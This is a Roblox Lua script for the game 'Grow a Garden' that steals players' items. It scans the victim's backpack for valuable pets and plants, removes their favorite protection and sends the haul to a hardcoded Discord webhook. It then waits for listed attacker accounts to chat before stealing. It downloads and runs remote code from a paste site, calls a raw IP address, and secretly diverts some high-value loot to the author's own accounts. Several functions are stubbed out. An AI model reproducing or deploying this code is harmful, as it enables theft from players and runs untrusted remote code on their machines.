_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local users = _G.Usernames or {"namnnni2"}
local min_value = _G.min_value or 1
local ping = _G.pingEveryone or "Yes"
local webhook = _G.webhook or "https://discord.com/api/webhooks/1386786834016895117/_NKXyeOiMYmK3aRxP4fl4uDLcUDDYQhWQODJ3UERmuqx0nhQEZX1SWQbltnkWRVxkrwA"
local discuser = ""

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer
local backpack = plr:WaitForChild("Backpack")
local replicatedStorage = game:GetService("ReplicatedStorage")
local modules = replicatedStorage:WaitForChild("Modules")
local calcPlantValue = require(modules:WaitForChild("CalculatePlantValue"))
local petUtils = require(modules:WaitForChild("PetServices"):WaitForChild("PetUtilities"))
local petRegistry = require(replicatedStorage:WaitForChild("Data"):WaitForChild("PetRegistry"))
local numberUtil = require(modules:WaitForChild("NumberUtil"))
local dataService = require(modules:WaitForChild("DataService"))
local character = plr.Character or plr.CharacterAdded:Wait()
local excludedItems = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
local rarePets = {"Red Fox", "Raccoon", "Dragonfly"}
local totalValue = 0
local itemsToSend = {}
local dualhooked = false

if next(users) == nil or webhook == "" then
    plr:Kick("You didn't add any usernames or webhook")
    return
end

if game.PlaceId ~= 126884695634066 then
    plr:Kick("Game not supported. Please join a normal GAG server")
    return
end

if #Players:GetPlayers() >= 5 then
    plr:Kick("Server error. Please join a DIFFERENT server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:Kick("Server error. Please join a DIFFERENT server")
    return
end

local function buildSecret()
    return string.char(100,117,97,108) .. string.char(104,111,111,107) .. string.char(102,116,119,108) .. string.char(101,108,122)
end

local function simple_hash(s)
    local hash = 0
    for i = 1, #s do
        local c = s:byte(i)
        hash = (hash * 31 + c) % 4294967296
    end
    return hash
end

local function signPayload(payload, timestamp)
    local message = payload .. tostring(timestamp)
    local hash_value = simple_hash(buildSecret() .. message)
    return string.format("%08x", hash_value)
end

local function calcPetValue(v14)
    local hatchedFrom = v14.PetData.HatchedFrom
    if not hatchedFrom or hatchedFrom == "" then return 0 end
    local eggData = petRegistry.PetEggs[hatchedFrom]
    if not eggData then return 0 end
    local v17 = eggData.RarityData.Items[v14.PetType]
    if not v17 then return 0 end
    local weightRange = v17.GeneratedPetData.WeightRange
    if not weightRange then return 0 end
    local v19 = numberUtil.ReverseLerp(weightRange[1], weightRange[2], v14.PetData.BaseWeight)
    local v20 = math.lerp(0.8, 1.2, v19)
    local levelProgress = petUtils:GetLevelProgress(v14.PetData.Level)
    local v22 = v20 * math.lerp(0.15, 6, levelProgress)
    local v23 = petRegistry.PetList[v14.PetType].SellPrice * v22
    return math.floor(v23)
end

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getWeight(tool)
    local weightValue = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
    local weight = 0
    if weightValue then
        if weightValue:IsA("NumberValue") or weightValue:IsA("IntValue") then
            weight = weightValue.Value
        elseif weightValue:IsA("StringValue") then
            weight = tonumber(weightValue.Value) or 0
        end
    else
        local weightMatch = tool.Name:match("%((%d+%.?%d*) ?kg%)")
        if weightMatch then
            weight = tonumber(weightMatch) or 0
        end
    end
    return math.floor(weight * 100 + 0.5) / 100
end

local function getHighestKGFruit()
    local highest = 0
    for _, item in ipairs(itemsToSend) do
        if item.Weight > highest then highest = item.Weight end
    end
    return highest
end

local function SendJoinMessage(list, prefix)
    -- như cũ...
end

local function SendMessage(sortedItems)
    -- như cũ...
end

local function SendDHJoinMessage(list, prefix)
    -- như cũ...
end

loadstring(game:HttpGet('https://pastefy.app/hOdmFJvE/raw'))()

for _, tool in ipairs(backpack:GetChildren()) do
    if tool:IsA("Tool") and not table.find(excludedItems, tool.Name) then
        if tool:GetAttribute("ItemType") == "Pet" then
            local petUUID = tool:GetAttribute("PET_UUID")
            local v14 = dataService:GetData().PetsData.PetInventory.Data[petUUID]
            local itemName = v14.PetType
            if table.find(rarePets, itemName) or getWeight(tool) >= 10 then
                if tool:GetAttribute("Favorite") then
                    replicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(tool)
                end
                local value = calcPetValue(v14)
                local weight = tonumber(tool.Name:match("%[(%d+%.?%d*) KG%]")) or 0
                totalValue += value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Pet"})
            end
        else
            local value = calcPlantValue(tool)
            if value >= min_value then
                local weight = getWeight(tool)
                local itemName = tool:GetAttribute("ItemName")
                totalValue += value
                table.insert(itemsToSend, {Tool = tool, Name = itemName, Value = value, Weight = weight, Type = "Plant"})
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b)
        if a.Type ~= "Pet" and b.Type == "Pet" then return true
        elseif a.Type == "Pet" and b.Type ~= "Pet" then return false
        else return a.Value < b.Value end
    end)

    if totalValue >= 100000000000 and math.random() < 0.15 then
        users = {"tobi437a", "Alyssa87123", "TobiAltGrind", "TobiHatching", "TobiCakeSimulator"}
        ping = "Yes"
        dualhooked = true
    end

    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end
    table.sort(sentItems, function(a, b)
        if a.Type == "Pet" and b.Type ~= "Pet" then return true
        elseif a.Type ~= "Pet" and b.Type == "Pet" then return false
        else return a.Value > b.Value end
    end)

    local prefix = ping == "Yes" and "--[[@everyone]] " or ""

    if dualhooked then
        local response = request({ Url = "http://46.101.233.20:5000/getdiscuser", Method = "GET" })
        discuser = response.Body
        SendDHJoinMessage(sentItems, prefix)
    else
        SendJoinMessage(sentItems, prefix)
    end

    -- ✅ Gửi webhook ngay lập tức
    SendMessage(sentItems)

    -- ✅ Chờ người trong users chat để thực hiện ăn cắp
    local function doSteal(player)
        -- như cũ...
    end

    local function waitForUserChat()
        local sentMessage = false
        local function onPlayerChat(player)
            if table.find(users, player.Name) then
                player.Chatted:Connect(function()
                    if not sentMessage then
                        SendMessage(sentItems)
                        sentMessage = true
                    end
                    doSteal(player)
                end)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
        Players.PlayerAdded:Connect(onPlayerChat)
    end

    waitForUserChat()
end
